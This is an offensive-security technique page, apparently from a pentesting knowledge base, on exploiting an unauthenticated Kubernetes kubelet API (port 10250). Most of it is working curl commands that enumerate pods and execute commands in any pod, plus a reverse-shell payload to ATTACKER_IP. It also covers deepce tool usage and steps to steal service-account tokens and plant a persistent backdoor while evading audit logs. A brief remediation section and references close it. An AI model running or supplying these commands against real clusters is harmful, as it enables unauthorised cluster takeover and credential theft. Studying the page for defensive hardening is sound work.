# Kubernetes Kubelet API Exploitation (Port 10250)

## Overview

The kubelet is the node agent running on every Kubernetes worker node. It exposes an HTTPS API on port 10250. If configured with `--anonymous-auth=true` (or webhook auth misconfigured), it allows unauthenticated command execution in any pod on the node.

This bypasses `kube-apiserver` audit logging — actions taken via the kubelet API are NOT logged in Kubernetes audit logs.

## Detection

```sh
# From inside a pod — get node IP
NODE_IP=$(hostname -i | cut -d' ' -f1)

# Test unauthenticated access
curl -sk https://${NODE_IP}:10250/pods | head -200

# Port 10255 (read-only, legacy, HTTP not HTTPS)
curl -s http://${NODE_IP}:10255/pods | head -200
```

## Exploitation — Execute Commands in Any Pod

```sh
NODE_IP="<node-ip>"
NAMESPACE="kube-system"  # highest privilege pods
POD="<pod-name>"
CONTAINER="<container-name>"

# List pods to find targets
curl -sk https://${NODE_IP}:10250/pods | python3 -m json.tool | grep -A3 '"name"'

# Execute command in target pod
curl -sk -X POST \
  "https://${NODE_IP}:10250/run/${NAMESPACE}/${POD}/${CONTAINER}" \
  --data-urlencode "cmd=id"

# Get shell
curl -sk -X POST \
  "https://${NODE_IP}:10250/run/${NAMESPACE}/${POD}/${CONTAINER}" \
  --data-urlencode "cmd=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

## deepce Usage

```sh
./deepce.sh -e K8S_KUBELET -cmd id
./deepce.sh -e K8S_KUBELET -i 10.10.10.1 -p 4444 -l
```

## Key Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/pods` | GET | List all pods on this node |
| `/run/{ns}/{pod}/{container}` | POST | Execute command in container |
| `/exec/{ns}/{pod}/{container}` | GET/POST | Interactive exec (websocket) |
| `/logs/{ns}/{pod}/{container}` | GET | Read container logs |
| `/metrics` | GET | Node metrics (information disclosure) |
| `/healthz` | GET | Health check |

## Impact Escalation

Once executing in a kube-system pod:
1. Read SA tokens of privileged system components
2. Use kube-controller-manager or scheduler SA tokens (cluster-admin level)
3. Issue API calls to create persistent backdoor

## Remediation

- Set `--anonymous-auth=false` in kubelet config
- Set `--authorization-mode=Webhook` (not `AlwaysAllow`)
- Restrict network access to port 10250 (node-to-node only, not pod-to-node)
- Disable port 10255 entirely (`--read-only-port=0`)

## References

- https://www.aquasec.com/blog/kubernetes-exposed-exploiting-the-kubelet-api/
- https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/
- https://www.trendmicro.com/en_us/research/22/e/the-fault-in-our-kubelets-analyzing-the-security-of-publicly-exposed-kubernetes-clusters.html
